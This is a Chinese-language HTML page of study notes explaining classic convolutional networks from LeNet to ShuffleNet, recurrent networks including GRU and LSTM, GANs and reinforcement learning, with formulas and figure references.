<h1 id="卷积神经网络"><a href="#卷积神经网络" class="headerlink" title="卷积神经网络"></a>卷积神经网络</h1><p>卷积神经⽹络（convolutional neural network）是含有卷积层（convolutional layer）的神经⽹<br>络。下面将按时间顺序介绍各类经典的卷积神经网络。</p>
<h2 id="卷积神经⽹络（LeNet）"><a href="#卷积神经⽹络（LeNet）" class="headerlink" title="卷积神经⽹络（LeNet）"></a>卷积神经⽹络（LeNet）</h2><p>LeNet是⼀个早期⽤来识别⼿写数字图像的卷积神经⽹络，于80 年代末期提出。这个名字来源于LeNet论⽂的第⼀作者Yann LeCun。LeNet展⽰了通过梯度下降训练卷积神经⽹络可以达到⼿写数字识别在当时最先进的结果。这个奠基性的⼯作第⼀次将卷积神经⽹络推上舞台，为世⼈所知。</p>
<h3 id="LeNet结构"><a href="#LeNet结构" class="headerlink" title="LeNet结构"></a>LeNet结构</h3><p>LeNet一共有7层（不包括输入层），可分为卷积层块和全连接层块两个部分，如图6所示。</p>
<p align="center">
    <img src="images/LeNet.png" width="90%" alt="LeNet结构"/>
</p>
<center>图6 LeNet结构</center>

<ul>
<li>输入层：输入图像的大小为32*32，这要比mnist数据库中的最大字母（28*28）还大。作用： 图像较大，这样做的目的是希望潜在的明显特征，比如笔画断续，角点等能够出现在最高层特征监测子感受野的中心。</li>
<li>卷积层：C1，C3，C5为卷积层，S2，S4为降采样层。</li>
<li>全连接层：F6为全连接层，还有一个输出层。</li>
</ul>
<h2 id="深度卷积神经⽹络（AlexNet）"><a href="#深度卷积神经⽹络（AlexNet）" class="headerlink" title="深度卷积神经⽹络（AlexNet）"></a>深度卷积神经⽹络（AlexNet）</h2><p>2012年，AlexNet横空出世。这个模型的名字来源于论⽂第⼀作者的姓名Alex Krizhevsky。AlexNet使⽤了8层卷积神经⽹络，并以很⼤的优势赢得了ImageNet 2012图像识别挑战赛。它⾸次证明了学习到的特征可以超越⼿⼯设计的特征，从而⼀举打破计算机视觉研究的前状。</p>
<h3 id="AlexNet与LeNet区别"><a href="#AlexNet与LeNet区别" class="headerlink" title="AlexNet与LeNet区别"></a>AlexNet与LeNet区别</h3><p>AlexNet与LeNet的设计理念⾮常相似，但也有显著的区别。</p>
<p>第⼀，与相对较小的LeNet相⽐，AlexNet包含8层变换，其中有5层卷积和2层全连接隐藏层，以及1个全连接输出层。</p>
<p>第⼆，AlexNet将sigmoid激活函数改成了更加简单的ReLU激活函数。</p>
<p>第三，AlexNet通过丢弃法来控制全连接层的模型复杂度。</p>
<p>第四，AlexNet引⼊了⼤量的图像增⼴，如翻转、裁剪和颜⾊变化，从而进⼀步扩⼤数据集来缓解过拟合。</p>
<h3 id="AlexNet结构"><a href="#AlexNet结构" class="headerlink" title="AlexNet结构"></a>AlexNet结构</h3><p>AlexNet的一些参数和结构图： </p>
<ul>
<li>卷积层：5层 </li>
<li>全连接层：3层 </li>
<li>深度：8层 </li>
<li>参数个数：60M </li>
<li>神经元个数：650k </li>
<li>分类数目：1000类</li>
</ul>
<p align="center">
    <img src="images/AlexNet.jpg" width="90%" alt="AlexNet结构"/>
</p>
<center>图7 AlexNet结构</center>

<p>由于当时的显卡容量问题，AlexNet 的60M个参数无法全部放在一张显卡上操作，所以采用了两张显卡分开操作的形式，其中在C3，R1，R2，R3层上出现交互，所谓的交互就是通道的合并，是一种串接操作。</p>
<h2 id="使⽤重复元素的⽹络（VGG网络）"><a href="#使⽤重复元素的⽹络（VGG网络）" class="headerlink" title="使⽤重复元素的⽹络（VGG网络）"></a>使⽤重复元素的⽹络（VGG网络）</h2><p>VGG的名字来源于论⽂作者所在的实验室Visual Geometry Group。2014年VGG提出了可以通过重复使⽤简单的基础块来构建深度模型的思路。</p>
<p>VGG块的组成规律是：连续使⽤数个相同的填充为1、窗口形状为3*3的卷积层后接上⼀个步幅为2、窗口形状为2*2的最⼤池化层。卷积层保持输⼊的⾼和宽不变，而池化层则对其减半。</p>
<p>VGG相比AlexNet的一个改进是采用连续的几个3x3的卷积核代替AlexNet中的较大卷积核（11x11，7x7，5x5）。对于给定的感受野（与输出有关的输入图片的局部大小），采用堆积的小卷积核是优于采用大的卷积核，因为多层非线性层可以增加网络深度来保证学习更复杂的模式，而且代价还比较小（参数更少）。</p>
<p>与AlexNet和LeNet⼀样，VGG⽹络由卷积层模块后接全连接层模块构成。卷积层模块串联数个vgg_block，其超参数由变量conv_arch定义。该变量指定了每个VGG块⾥卷积层个数和输出通道数。全连接模块则跟AlexNet中的⼀样。</p>
<p>构造⼀个最简单的VGG⽹络VGG-11。它有5个卷积块，前2块使⽤单卷积层，而后3块使⽤双卷积层。第⼀块的输出通道是64，之后每次对输出通道数翻倍，直到变为512。</p>
<p align="center">
    <img src="images/vgg.png" width="90%" alt="VGG结构"/>
</p>
<center>图8 VGG结构</center>

<h2 id="⽹络中的⽹络（NiN）"><a href="#⽹络中的⽹络（NiN）" class="headerlink" title="⽹络中的⽹络（NiN）"></a>⽹络中的⽹络（NiN）</h2><p>在AlexNet问世不久，⽹络中的⽹络（NiN）提出即串联多个由卷积层和“全连接”层构成的小⽹络来构建⼀个深层⽹络。</p>
<p>卷积层的输⼊和输出通常是四维数组（样本，通道，⾼，宽），而全连接层的输⼊和输出则通常是⼆维数组（样本，特征）。如果想在全连接层后再接上卷积层，则需要将全连接层的输出变换为四维。1*1卷积层可以看成全连接层中空间维度（⾼和宽）上的每个元素相当于样本，通道相当于特征。因此， NiN使⽤1*1卷积层来替代全连接层，从而使空间信息能够⾃然传递到后⾯的层中去。</p>
<p>NiN结构（右边）与AlexNet、VGG（左边）的区别：</p>
<p align="center">
    <img src="images/NiN_VS_VGG.jpg" width="90%" alt="NiN与VGG区别"/>
</p>
<center>图9 NiN与VGG区别</center>

<p>NiN块是NiN中的基础块。它由⼀个卷积层加两个充当全连接层的1 * 1卷积层串联而成。其中第⼀个卷积层的超参数可以⾃⾏设置，而第⼆和第三个卷积层的超参数⼀般是固定的。</p>
<p>NiN重复使⽤由卷积层和代替全连接层的1 * 1卷积层构成的NiN块来构建深层⽹络。NiN去除了容易造成过拟合的全连接输出层，而是将其替换成输出通道数等于标签类别数的NiN块和全局平均池化层。</p>
<h2 id="含并⾏连结的⽹络（GoogLeNet）"><a href="#含并⾏连结的⽹络（GoogLeNet）" class="headerlink" title="含并⾏连结的⽹络（GoogLeNet）"></a>含并⾏连结的⽹络（GoogLeNet）</h2><p>在2014年的ImageNet图像识别挑战赛中，⼀个名叫GoogLeNet的⽹络结构⼤放异彩。它虽然在名字上向LeNet致敬，但在⽹络结构上已经很难看到LeNet的影⼦。GoogLeNet吸收了NiN中⽹络串联⽹络的思想，并在此基础上做了很⼤改进。</p>
<p>GoogLeNet中的基础卷积块叫作Inception块，得名于同名电影《盗梦空间》（Inception）。与NiN块相⽐，这个基础块在结构上更加复杂，如图所⽰。</p>
<p align="center">
    <img src="images/inception.svg" width="90%" alt="Inception块结构"/>
</p>
<center>图10 Inception块结构</center>

<p>Inception块⾥有4条并⾏的线路。前3条线路使⽤窗口⼤小分别是1 * 1、3 * 3和5 * 5的卷积层来抽取不同空间尺⼨下的信息，其中中间2个线路会对输⼊先做1 * 1卷积来减少输⼊通道数，以降低模型复杂度。第四条线路则使⽤3*3最⼤池化层，后接1*1卷积层来改变通道数。4条线路都使⽤了合适的填充来使输⼊与输出的⾼和宽⼀致。最后我们将每条线路的输出在通道维上连结，并输⼊接下来的层中去。</p>
<p>Inception块中可以⾃定义的超参数是每个层的输出通道数，以此来控制模型复杂度。</p>
<p>GoogLeNet跟VGG⼀样，在主体卷积部分中使⽤5个模块（block），每个模块之间使⽤步幅为2的3*3最⼤池化层来减小输出⾼宽。</p>
<h2 id="残差网络（ResNet）"><a href="#残差网络（ResNet）" class="headerlink" title="残差网络（ResNet）"></a>残差网络（ResNet）</h2><p>让我们先思考一个问题：对神经网络模型添加新的层，充分训练后的模型是否只可能更有效地降低训练误差？理论上，原模型解的空间只是新模型解的空间的子空间。也就是说，如果我们能将新添加的层训练成恒等映射 f(x)=x ，新模型和原模型将同样有效。由于新模型可能得出更优的解来拟合训练数据集，因此添加层似乎更容易降低训练误差。然而在实践中，添加过多的层后训练误差往往不降反升。即使利用批量归一化带来的数值稳定性使训练深层模型更加容易，该问题仍然存在。针对这一问题，何恺明等人提出了残差网络（ResNet）。它在2015年的ImageNet图像识别挑战赛夺魁，并深刻影响了后来的深度神经网络的设计。</p>
<p>让我们聚焦于神经网络局部。如图11所示，设输入为 x 。假设我们希望学出的理想映射为 f(x) ，从而作为图11上方激活函数的输入。左图虚线框中的部分需要直接拟合出该映射 f(x) ，而右图虚线框中的部分则需要拟合出有关恒等映射的残差映射 f(x)−x 。残差映射在实际中往往更容易优化。以本节开头提到的恒等映射作为我们希望学出的理想映射 f(x) 。我们只需将图11中右图虚线框内上方的加权运算（如仿射）的权重和偏差参数学成0，那么 f(x) 即为恒等映射。实际中，当理想映射 f(x) 极接近于恒等映射时，残差映射也易于捕捉恒等映射的细微波动。<strong>图11右图也是ResNet的基础块，即残差块（residual block）。在残差块中，输入可通过跨层的数据线路更快地向前传播。</strong></p>
<p align="center">
    <img src="images/residual-block.svg" width="90%" alt="ResNet残差块结构"/>
</p>
<center>图11 ResNet残差块结构</center>

<p>ResNet沿用了VGG全 3×3 卷积层的设计。残差块里首先有2个有相同输出通道数的 3×3 卷积层。每个卷积层后接一个批量归一化层和ReLU激活函数。然后我们将输入跳过这两个卷积运算后直接加在最后的ReLU激活函数前。这样的设计要求两个卷积层的输出与输入形状一样，从而可以相加。如果想改变通道数，就需要引入一个额外的 1×1 卷积层来将输入变换成需要的形状后再做相加运算。</p>
<h2 id="稠密连接网络（DenseNet）"><a href="#稠密连接网络（DenseNet）" class="headerlink" title="稠密连接网络（DenseNet）"></a>稠密连接网络（DenseNet）</h2><p>稠密连接网络（DenseNet）与ResNet的主要区别如图12所示。</p>
<p align="center">
    <img src="images/densenet.svg" width="90%" alt="ResNet（左）与DenseNet（右）在跨层连接上的主要区别：使用相加和使用连结"/>
</p>
<center>图12 ResNet（左）与DenseNet（右）在跨层连接上的主要区别：使用相加和使用连结</center>

<p>图12中将部分前后相邻的运算抽象为模块A和模块B。与ResNet的主要区别在于，DenseNet里模块B的输出不是像ResNet那样和模块A的输出相加，而是在通道维上连结。这样模块A的输出可以直接传入模块B后面的层。在这个设计里，模块A直接跟模块B后面的所有层连接在了一起。这也是它被称为“稠密连接”的原因。</p>
<p>DenseNet的主要构建模块是稠密块（dense block）和过渡层（transition layer）。前者定义了输入和输出是如何连结的，后者则用来控制通道数，使之不过大。</p>
<h2 id="MobileNets：同样的卷积层，更少的参数"><a href="#MobileNets：同样的卷积层，更少的参数" class="headerlink" title="MobileNets：同样的卷积层，更少的参数"></a>MobileNets：同样的卷积层，更少的参数</h2><p>MobileNet，正如其名，这是一个非常简单快速并且准确率也不错的CNN网络结构，它大大减少了网络层的参数数量，使得网络的前向传播和后向传播的运算量大幅减少，最终成为了一个效率极高的CNN网络。</p>
<h2 id="ShuffleNets：Group-convolution-Channel-Shuffle"><a href="#ShuffleNets：Group-convolution-Channel-Shuffle" class="headerlink" title="ShuffleNets：Group convolution+Channel Shuffle"></a>ShuffleNets：Group convolution+Channel Shuffle</h2><p>ShuffleNet是Face++提出的一种轻量化网络结构，主要思路是使用Group convolution和Channel shuffle改进ResNet，可以看作是ResNet的压缩版本。</p>
<h1 id="循环神经网络"><a href="#循环神经网络" class="headerlink" title="循环神经网络"></a>循环神经网络</h1><p>循环神经网络是为更好地处理时序信息而设计的。它引入状态变量来存储过去的信息，并用其与当前的输入共同决定当前的输出。</p>
<p>循环神经网络常用于处理序列数据，如一段文字或声音、购物或观影的顺序，甚至是图像中的一行或一列像素。因此，循环神经网络有着极为广泛的实际应用，如语言模型、文本分类、机器翻译、语音识别、图像分析、手写识别和推荐系统。</p>
<p>现在我们考虑输入数据存在时间相关性的情况。假设 $X_t∈R^{n×d}$ 是序列中时间步 $t$ 的小批量输入，$H_t∈R^{n×h}$ 是该时间步的隐藏变量。与多层感知机不同的是，这里我们保存上一时间步的隐藏变量 $H_{t−1}$ ，并引入一个新的权重参数 $W_{hh}∈R^{h×h}$ ，该参数用来描述在当前时间步如何使用上一时间步的隐藏变量。具体来说，时间步 $t$ 的隐藏变量的计算由当前时间步的输入和上一时间步的隐藏变量共同决定：</p>
<p>$$H_t=ϕ(X_tW_{xh}+H_{t−1}W_{hh}+b_h)$$</p>
<p>与多层感知机相比，我们在这里添加了 $H_{t−1}W_{hh}$一项。由上式中相邻时间步的隐藏变量 $H_t$ 和 $H_{t−1}$ 之间的关系可知，这里的隐藏变量能够捕捉截至当前时间步的序列的历史信息，就像是神经网络当前时间步的状态或记忆一样。因此，该隐藏变量也称为隐藏状态。由于隐藏状态在当前时间步的定义使用了上一时间步的隐藏状态，上式的计算是循环的。<strong>使用循环计算的网络即循环神经网络（recurrent neural network）</strong>。</p>
<p>循环神经网络有很多种不同的构造方法。含上式所定义的隐藏状态的循环神经网络是极为常见的一种。若无特别说明，本章中的循环神经网络均基于上式中隐藏状态的循环计算。在时间步 $t$ ，输出层的输出和多层感知机中的计算类似：</p>
<p>$$O_t=H_tW_{hq}+b_q$$</p>
<p>循环神经网络的参数包括隐藏层的权重 $W_{xh}∈R^{d×h}$ 、 $W_{hh}∈R^{h×h}$ 和偏差  $b_h∈R^{1×h}$ ，以及输出层的权重 $W_{hq}∈R^{h×q}$ 和偏差 $b_q∈R^{1×q}$ 。值得一提的是，即便在不同时间步，循环神经网络也始终使用这些模型参数。因此，循环神经网络模型参数的数量不随时间步的增加而增长。</p>
<p>图13展示了循环神经网络在3个相邻时间步的计算逻辑。在时间步 $t$ ，隐藏状态的计算可以看成是将输入 $X_t$ 和前一时间步隐藏状态 $H_{t−1}$ 连结后输入一个激活函数为 $ϕ$ 的全连接层。该全连接层的输出就是当前时间步的隐藏状态 $H_t$ ，且模型参数为 $W_{xh}$ 与 $W_{hh}$ 的连结，偏差为 $b_h$ 。当前时间步 $t$ 的隐藏状态 $H_t$ 将参与下一个时间步 $t+1$ 的隐藏状态 $H_{t+1}$ 的计算，并输入到当前时间步的全连接输出层。</p>
<p align="center">
    <img src="images/rnn.svg" width="90%" alt="含隐藏状态的循环神经网络"/>
</p>
<center>图13 含隐藏状态的循环神经网络</center>

<h2 id="门控循环单元（GRU）"><a href="#门控循环单元（GRU）" class="headerlink" title="门控循环单元（GRU）"></a>门控循环单元（GRU）</h2><p>当时间步数较大或者时间步较小时，循环神经网络的梯度较容易出现衰减或爆炸。虽然裁剪梯度可以应对梯度爆炸，但无法解决梯度衰减的问题。通常由于这个原因，循环神经网络在实际中较难捕捉时间序列中时间步距离较大的依赖关系。</p>
<p>门控循环神经网络（gated recurrent neural network）的提出，正是为了更好地捕捉时间序列中时间步距离较大的依赖关系。它通过可以学习的门来控制信息的流动。其中，门控循环单元（gated recurrent unit，GRU）是一种常用的门控循环神经网络。</p>
<p>门控循环单元引入了重置门（reset gate）和更新门（update gate）的概念，从而修改了循环神经网络中隐藏状态的计算方式。门控循环单元中的重置门和更新门的输入均为当前时间步输入 $X_t$ 与上一时间步隐藏状态 $H_{t−1}$ ，输出由激活函数为sigmoid函数的全连接层计算得到。</p>
<p align="center">
    <img src="images/gru_2.svg" width="90%" alt="门控循环单元中候选隐藏状态的计算"/>
</p>
<center>图14 门控循环单元中候选隐藏状态的计算</center>

<p>具体来说，时间步 $t$ 的候选隐藏状态 $\tilde{\boldsymbol{H}}_t∈R^{n×h}$ 的计算为</p>
<p>$$\tilde{\boldsymbol{H}}<em>t=tanh(X_tW</em>{xh}+(R_t⊙H_{t−1})W_{hh}+b_h)$$</p>
<p>其中 $W_{xh}∈R^{d×h}$ 和 $W_{hh}∈R^{h×h}$ 是权重参数， $b_h∈R^{1×h}$ 是偏差参数。从上面这个公式可以看出，重置门控制了上一时间步的隐藏状态如何流入当前时间步的候选隐藏状态。而上一时间步的隐藏状态可能包含了时间序列截至上一时间步的全部历史信息。因此，重置门可以用来丢弃与预测无关的历史信息。</p>
<p>最后，时间步 $t$ 的隐藏状态 $H_t∈R^{n×h}$ 的计算使用当前时间步的更新门 $Z_t$ 来对上一时间步的隐藏状态 $H_{t−1}$ 和当前时间步的候选隐藏状态 $\tilde{\boldsymbol{H}}_t$ 做组合：</p>
<p>$$Ht=Zt⊙Ht−1+(1−Zt)⊙\tilde{\boldsymbol{H}}_t$$</p>
<p align="center">
    <img src="images/gru_3.svg" width="90%" alt="门控循环单元中隐藏状态的计算"/>
</p>
<center>图15 门控循环单元中隐藏状态的计算</center>

<p>值得注意的是，更新门可以控制隐藏状态应该如何被包含当前时间步信息的候选隐藏状态所更新。</p>
<p>我们对门控循环单元的设计稍作总结：</p>
<ul>
<li>重置门有助于捕捉时间序列里短期的依赖关系；</li>
<li>更新门有助于捕捉时间序列里长期的依赖关系。</li>
</ul>
<h2 id="长短期记忆（LSTM）"><a href="#长短期记忆（LSTM）" class="headerlink" title="长短期记忆（LSTM）"></a>长短期记忆（LSTM）</h2><p>LSTM 中引入了3个门，即输入门（input gate）、遗忘门（forget gate）和输出门（output gate），以及与隐藏状态形状相同的记忆细胞（某些文献把记忆细胞当成一种特殊的隐藏状态），从而记录额外的信息。</p>
<h3 id="输入门、遗忘门和输出门"><a href="#输入门、遗忘门和输出门" class="headerlink" title="输入门、遗忘门和输出门"></a>输入门、遗忘门和输出门</h3><p>与门控循环单元中的重置门和更新门一样，如图16所示，长短期记忆的门的输入均为当前时间步输入 $X_t$ 与上一时间步隐藏状态 $H_{t−1}$ ，输出由激活函数为sigmoid函数的全连接层计算得到。如此一来，这3个门元素的值域均为 [0,1] 。</p>
<p align="center">
    <img src="images/lstm_0.svg" width="90%" alt="长短期记忆中输入门、遗忘门和输出门的计算"/>
</p>
<center>图16 长短期记忆中输入门、遗忘门和输出门的计算</center>

<p>具体来说，假设隐藏单元个数为$h$，给定时间步$t$的小批量输入$\boldsymbol{X}t \in \mathbb{R}^{n \times d}$（样本数为$n$，输入个数为$d$）和上一时间步隐藏状态$\boldsymbol{H}_{t-1} \in \mathbb{R}^{n \times h}$。 时间步$t$的输入门$\boldsymbol{I}_t \in \mathbb{R}^{n \times h}$、遗忘门$\boldsymbol{F}_t \in \mathbb{R}^{n \times h}$和输出门$\boldsymbol{O}_t \in \mathbb{R}^{n \times h}$分别计算如下：</p>
<p>$$ \begin{aligned} \boldsymbol{I}<em>t &amp;= \sigma(\boldsymbol{X}_t \boldsymbol{W}</em>{xi} + \boldsymbol{H}<em>{t-1} \boldsymbol{W}</em>{hi} + \boldsymbol{b}_i)\end{aligned}$$</p>
<p>$$\begin{aligned} \boldsymbol{F}<em>t &amp;= \sigma(\boldsymbol{X}_t \boldsymbol{W}</em>{xf} + \boldsymbol{H}<em>{t-1} \boldsymbol{W}</em>{hf} + \boldsymbol{b}_f)\end{aligned}$$</p>
<p>$$\begin{aligned} \boldsymbol{O}<em>t &amp;= \sigma(\boldsymbol{X}_t \boldsymbol{W}</em>{xo} + \boldsymbol{H}<em>{t-1} \boldsymbol{W}</em>{ho} + \boldsymbol{b}_o)\end{aligned} $$</p>
<p>其中的$\boldsymbol{W}<em>{xi}, \boldsymbol{W}</em>{xf}, \boldsymbol{W}<em>{xo} \in \mathbb{R}^{d \times h}$和$\boldsymbol{W}</em>{hi}, \boldsymbol{W}<em>{hf}, \boldsymbol{W}</em>{ho} \in \mathbb{R}^{h \times h}$是权重参数，$\boldsymbol{b}_i, \boldsymbol{b}_f, \boldsymbol{b}_o \in \mathbb{R}^{1 \times h}$是偏差参数。</p>
<h3 id="候选记忆细胞"><a href="#候选记忆细胞" class="headerlink" title="候选记忆细胞"></a>候选记忆细胞</h3><p>接下来，长短期记忆需要计算候选记忆细胞$\tilde{\boldsymbol{C}}_t$。它的计算与上面介绍的3个门类似，但使用了值域在$[-1, 1]$的tanh函数作为激活函数，如图17所示。</p>
<p align="center">
    <img src="images/lstm_1.svg" width="90%" alt="长短期记忆中候选记忆细胞的计算"/>
</p>
<center>图17 长短期记忆中候选记忆细胞的计算</center>

<p>具体来说，时间步$t$的候选记忆细胞$\tilde{\boldsymbol{C}}_t \in \mathbb{R}^{n \times h}$的计算为</p>
<p>$$\tilde{\boldsymbol{C}}t = \text{tanh}(\boldsymbol{X}t \boldsymbol{W}{xc} + \boldsymbol{H}{t-1} \boldsymbol{W}_{hc} + \boldsymbol{b}_c),$$</p>
<p>其中$\boldsymbol{W}<em>{xc} \in \mathbb{R}^{d \times h}$和$\boldsymbol{W}</em>{hc} \in \mathbb{R}^{h \times h}$是权重参数，$\boldsymbol{b}_c \in \mathbb{R}^{1 \times h}$是偏差参数。</p>
<h3 id="记忆细胞"><a href="#记忆细胞" class="headerlink" title="记忆细胞"></a>记忆细胞</h3><p>我们可以通过元素值域在$[0, 1]$的输入门、遗忘门和输出门来控制隐藏状态中信息的流动，这一般也是通过使用按元素乘法（符号为$\odot$）来实现的。当前时间步记忆细胞$\boldsymbol{C}_t \in \mathbb{R}^{n \times h}$的计算组合了上一时间步记忆细胞和当前时间步候选记忆细胞的信息，并通过遗忘门和输入门来控制信息的流动：</p>
<p>$$\boldsymbol{C}_t = \boldsymbol{F}t \odot \boldsymbol{C}{t-1} + \boldsymbol{I}_t \odot \tilde{\boldsymbol{C}}_t.$$</p>
<p>如图6.9所示，遗忘门控制上一时间步的记忆细胞$\boldsymbol{C}_{t-1}$中的信息是否传递到当前时间步，而输入门则控制当前时间步的输入$\boldsymbol{X}_t$通过候选记忆细胞$\tilde{\boldsymbol{C}}_t$如何流入当前时间步的记忆细胞。如果遗忘门一直近似1且输入门一直近似0，过去的记忆细胞将一直通过时间保存并传递至当前时间步。这个设计可以应对循环神经网络中的梯度衰减问题，并更好地捕捉时间序列中时间步距离较大的依赖关系。</p>
<p align="center">
    <img src="images/lstm_2.svg" width="90%" alt="长短期记忆中候选记忆细胞的计算"/>
</p>
<center>图18 长短期记忆中候选记忆细胞的计算</center>

<h3 id="隐藏状态"><a href="#隐藏状态" class="headerlink" title="隐藏状态"></a>隐藏状态</h3><p>有了记忆细胞以后，接下来我们还可以通过输出门来控制从记忆细胞到隐藏状态$\boldsymbol{H}_t \in \mathbb{R}^{n \times h}$的信息的流动：</p>
<p>$$\boldsymbol{H}_t = \boldsymbol{O}_t \odot \text{tanh}(\boldsymbol{C}_t).$$</p>
<p>这里的tanh函数确保隐藏状态元素值在-1到1之间。需要注意的是，当输出门近似1时，记忆细胞信息将传递到隐藏状态供输出层使用；当输出门近似0时，记忆细胞信息只自己保留。图6.10展示了长短期记忆中隐藏状态的计算。</p>
<p align="center">
    <img src="images/lstm_3.svg" width="90%" alt="长短期记忆中隐藏状态的计算"/>
</p>
<center>图19 长短期记忆中隐藏状态的计算</center>

<h2 id="深度循环神经网络"><a href="#深度循环神经网络" class="headerlink" title="深度循环神经网络"></a>深度循环神经网络</h2><p>在深度学习应用里，我们通常会用到含有多个隐藏层的循环神经网络，也称作深度循环神经网络。图20演示了一个有 L 个隐藏层的深度循环神经网络，每个隐藏状态不断传递至当前层的下一时间步和当前时间步的下一层。</p>
<p align="center">
    <img src="images/deep-rnn.svg" width="90%" alt="深度循环神经网络的架构"/>
</p>
<center>图20 深度循环神经网络的架构</center>

<p>具体来说，在时间步$t$里，设小批量输入$\boldsymbol{X}_t \in \mathbb{R}^{n \times d}$（样本数为$n$，输入个数为$d$），第$\ell$隐藏层（$\ell=1,\ldots,L$）的隐藏状态为$\boldsymbol{H}_t^{(\ell)} \in \mathbb{R}^{n \times h}$（隐藏单元个数为$h$），输出层变量为$\boldsymbol{O}_t \in \mathbb{R}^{n \times q}$（输出个数为$q$），且隐藏层的激活函数为$\phi$。第1隐藏层的隐藏状态和之前的计算一样：</p>
<p>$$\boldsymbol{H}<em>t^{(1)} = \phi(\boldsymbol{X}_t \boldsymbol{W}</em>{xh}^{(1)} + \boldsymbol{H}<em>{t-1}^{(1)} \boldsymbol{W}</em>{hh}^{(1)} + \boldsymbol{b}_h^{(1)}),$$</p>
<p>其中权重$\boldsymbol{W}<em>{xh}^{(1)} \in \mathbb{R}^{d \times h}$、$\boldsymbol{W}</em>{hh}^{(1)} \in \mathbb{R}^{h \times h}$和偏差 $\boldsymbol{b}_h^{(1)} \in \mathbb{R}^{1 \times h}$分别为第1隐藏层的模型参数。</p>
<p>当$1 &lt; \ell \leq L$时，第$\ell$隐藏层的隐藏状态的表达式为</p>
<p>$$\boldsymbol{H}<em>t^{(\ell)} = \phi(\boldsymbol{H}_t^{(\ell-1)} \boldsymbol{W}</em>{xh}^{(\ell)} + \boldsymbol{H}<em>{t-1}^{(\ell)} \boldsymbol{W}</em>{hh}^{(\ell)} + \boldsymbol{b}_h^{(\ell)}),$$</p>
<p>其中权重$\boldsymbol{W}<em>{xh}^{(\ell)} \in \mathbb{R}^{h \times h}$、$\boldsymbol{W}</em>{hh}^{(\ell)} \in \mathbb{R}^{h \times h}$和偏差 $\boldsymbol{b}_h^{(\ell)} \in \mathbb{R}^{1 \times h}$分别为第$\ell$隐藏层的模型参数。</p>
<p>最终，输出层的输出只需基于第$L$隐藏层的隐藏状态：</p>
<p>$$\boldsymbol{O}<em>t = \boldsymbol{H}_t^{(L)} \boldsymbol{W}</em>{hq} + \boldsymbol{b}_q,$$</p>
<p>其中权重$\boldsymbol{W}_{hq} \in \mathbb{R}^{h \times q}$和偏差$\boldsymbol{b}_q \in \mathbb{R}^{1 \times q}$为输出层的模型参数。</p>
<p>同多层感知机一样，隐藏层个数$L$和隐藏单元个数$h$都是超参数。此外，如果将隐藏状态的计算换成门控循环单元或者长短期记忆的计算，我们可以得到深度门控循环神经网络。</p>
<h2 id="双向循环神经网络"><a href="#双向循环神经网络" class="headerlink" title="双向循环神经网络"></a>双向循环神经网络</h2><p>之前介绍的循环神经网络模型都是假设当前时间步是由前面的较早时间步的序列决定的，因此它们都将信息通过隐藏状态从前往后传递。有时候，当前时间步也可能由后面时间步决定。例如，当我们写下一个句子时，可能会根据句子后面的词来修改句子前面的用词。双向循环神经网络通过增加从后往前传递信息的隐藏层来更灵活地处理这类信息。图21演示了一个含单隐藏层的双向循环神经网络的架构。</p>
<p align="center">
    <img src="images/birnn.svg" width="90%" alt="双向循环神经网络的架构"/>
</p>
<center>图21 双向循环神经网络的架构</center>

<p>#生成模型</p>
<p>在概率统计理论中, 生成模型是指能够随机生成观测数据的模型，尤其是在给定某些隐含参数的条件下。它给观测值和标注数据序列指定一个联合概率分布。在机器学习中，生成模型可以用来直接对数据建模（例如根据某个变量的概率密度函数进行数据采样），也可以用来建立变量间的条件概率分布。条件概率分布可以由生成模型根据贝叶斯定理形成。</p>
<p>香农 (1948) 给出了有一个英语双词频率表生成句子的例子。可以生成如“representing and speedily is an good”这种句子。一开始并不能生成正确的英文句子，但随着词频表由双词扩大为三词甚至多词，生成的句子也就慢慢的成型了。</p>
<p>生成模型的定义与判别模型相对应：生成模型是所有变量的全概率模型，而判别模型是在给定观测变量值前提下目标变量条件概率模型。因此生成模型能够用于模拟（即生成）模型中任意变量的分布情况，而判别模型只能根据观测变量得到目标变量的采样。判别模型不对观测变量的分布建模，因此它不能够表达观测变量与目标变量之间更复杂的关系。因此，生成模型更适用于无监督的任务，如分类和聚类。</p>
<h2 id="生成对抗网络"><a href="#生成对抗网络" class="headerlink" title="生成对抗网络"></a>生成对抗网络</h2><p>生成对抗网络（英语：Generative Adversarial Network，简称GAN）是非监督式学习的一种方法，通过让两个神经网络相互博弈的方式进行学习。该方法由伊恩·古德费洛等人于2014年提出。[1]</p>
<p>生成对抗网络由一个生成网络与一个判别网络组成。生成网络从潜在空间（latent space）中随机采样作为输入，其输出结果需要尽量模仿训练集中的真实样本。判别网络的输入则为真实样本或生成网络的输出，其目的是将生成网络的输出从真实样本中尽可能分辨出来。而生成网络则要尽可能地欺骗判别网络。两个网络相互对抗、不断调整参数，最终目的是使判别网络无法判断生成网络的输出结果是否真实。[2][1][3]</p>
<p>生成对抗网络常用于生成以假乱真的图片。[4]此外，该方法还被用于生成视频[5]、三维物体模型[6]等。</p>
<h1 id="强化学习"><a href="#强化学习" class="headerlink" title="强化学习"></a>强化学习</h1><p>强化学习（英语：Reinforcement learning，简称RL）是机器学习中的一个领域，强调如何基于环境而行动，以取得最大化的预期利益。其灵感来源于心理学中的行为主义理论，即有机体如何在环境给予的奖励或惩罚的刺激下，逐步形成对刺激的预期，产生能获得最大利益的习惯性行为。这个方法具有普适性，因此在其他许多领域都有研究，例如博弈论、控制论、运筹学、信息论、仿真优化、多主体系统学习、群体智能、统计学以及遗传算法。在运筹学和控制理论研究的语境下，强化学习被称作“近似动态规划”（approximate dynamic programming，ADP）。在最优控制理论中也有研究这个问题，虽然大部分的研究是关于最优解的存在和特性，并非是学习或者近似方面。在经济学和博弈论中，强化学习被用来解释在有限理性的条件下如何出现平衡。</p>
<p>在机器学习问题中，环境通常被规范为马可夫决策过程（MDP），所以许多强化学习算法在这种情况下使用动态规划技巧。传统的技术和强化学习算法的主要区别是，后者不需要关于MDP的知识，而且针对无法找到确切方法的大规模MDP。</p>
<p>强化学习和标准的监督式学习之间的区别在于，它并不需要出现正确的输入/输出对，也不需要精确校正次优化的行为。强化学习更加专注于在线规划，需要在探索（在未知的领域）和遵从（现有知识）之间找到平衡。强化学习中的“探索-遵从”的交换，在多臂老虎机（英语：multi-armed bandit）问题和有限MDP中研究得最多。</p>
